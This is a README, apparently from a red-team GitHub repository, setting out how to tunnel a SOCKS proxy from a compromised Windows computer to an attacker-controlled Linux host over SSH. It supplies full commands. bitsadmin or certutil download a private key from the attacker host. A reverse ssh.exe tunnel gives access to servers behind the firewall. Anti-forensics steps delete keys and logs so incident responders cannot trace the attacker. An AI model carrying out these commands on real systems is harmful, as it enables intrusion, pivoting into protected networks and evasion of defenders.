# win-ssh-rvsproxy
Tunneling Socks proxy through Windows.

This document presents a Red Team approach for tunneling a Socks proxy through SSH on a compromised Windows computer from an external attacker-controlled Linux host.  How the Windows computer is compromised is not covered here; the assumption is that you have a way to run commands on the victim host.

The following diagram shows the scenario.  An external attacker system (A) is running sshd to allow tunnel creation, and will also run python SimpleHTTPServer to serve an ephemeral SSH key to allow the Windows computer (B) to log in.  The Windows target (B) will execute the built-in ssh.exe command line utility and create a Socks proxy, through which the attacker (A) can access other systems protected behind the firewall, such as the web server (C).

![alt text](https://github.com/billchaison/win-ssh-rvsproxy/blob/main/01.png)

**Preparing the attack host**<br />

*To configure a low-privilege user without a password as an alternative to relying on SSH keys see the section* **Alternate attack host preparation**

* On host (A) create a disposable SSH key pair.  The key will be destroyed after use in order to prevent reuse by incident responders.<br /><br />
  `cd /root`<br /><br />
  `ssh-keygen -t rsa -b 2048 -N "" -f /root/temp_rsa -q`<br /><br />
  `cat /root/temp_rsa.pub >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys`<br /><br />
* On host (A) launch python simple HTTP server.  This will allow the victim computer (B) to dynamically fetch the temporary private SSH key to login and start the tunnel.<br /><br />
  `python -m SimpleHTTPServer 80`<br />

**Start the proxy server**<br />

* On the victim Windows computer (B) you will need to find a way to copy the SSH private key to the user's `%tmp%` path in this example.  Two possibilities are as follows.<br /><br />
  `%SYSTEMROOT%\System32\bitsadmin.exe /transfer n http://192.168.1.242/temp_rsa %tmp%\temp_rsa`<br /><br />
  `%SYSTEMROOT%\System32\certutil.exe -urlcache -split -f http://192.168.1.242/temp_rsa %tmp%\temp_rsa`<br /><br />
* On the victim Windows computer (B) create the reverse proxy and tunnel.  Once connected to the attacker computer (A) the temporary key will be stripped from the authorized_keys file and the python web server will be terminated.  Also the private key stored on machine (B) under `%tmp%` will be deleted after the tunnel is destroyed by the attacker.  These are anti-forensics techniques to prevent incident responders from gaining access to your attacker machine (A).<br /><br />
  `%SYSTEMROOT%\System32\OpenSSH\ssh.exe -o StrictHostKeychecking=no -i %tmp%\temp_rsa -R localhost:1080 root@192.168.1.242 "grep -v -f /root/temp_rsa.pub /root/.ssh/authorized_keys > /root/.ssh/authorized_keys.bak && mv /root/.ssh/authorized_keys.bak /root/.ssh/authorized_keys && kill $(lsof -t -i:80) && bash" & del %tmp%\temp_rsa`<br />

**Using the reverse proxy**<br />

From the attacker host (A) you can configure a browser to use the local Socks proxy on 127.0.0.1 port 1080.  You should now be able to access the protected web server (C) by going to `https://10.1.2.4`

Any other protected service behind the firewall could be accessed through Socks tunnel as long as the tools on the attacking machine (A) support Socks or you have proxychains configured to use 127.0.0.1 port 1080.

When you are finished and want to terminate the reverse proxy, issue the following command on the attacker host (A).

`kill $(lsof -t -i:1080)`

**Alternate attack host preparation**<br />

* On Attack host (A) create a low-priv user, remove the password, and allow the user account to log on without a password.<br /><br />
  `adduser tempuser` (supply a password when prompted, will be removed in the next step)<br /><br />
  `passwd -d -u tempuser`<br /><br />
  Edit `sshd_config` and add the following section:<br /><br />
  ```
  Match User tempuser
   PasswordAuthentication yes
   PermitEmptyPasswords yes
   AllowTcpForwarding yes
  ```

  Restart SSH `systemctl restart ssh`<br /><br />
* On the Windows victim computer (B) start the proxy server with this command.  No key is needed:<br /><br />
  `%SYSTEMROOT%\System32\OpenSSH\ssh.exe -o StrictHostKeychecking=no -R localhost:1080 tempuser@192.168.1.242 "bash"`<br /><br />
* To disable the tempuser account on host (A) to prevent further logins, execute the following command:<br /><br />
  `usermod -L tempuser`<br /><br />
  When finished delete the tempuser account `deluser --remove-home tempuser` and clean up `sshd_config`.
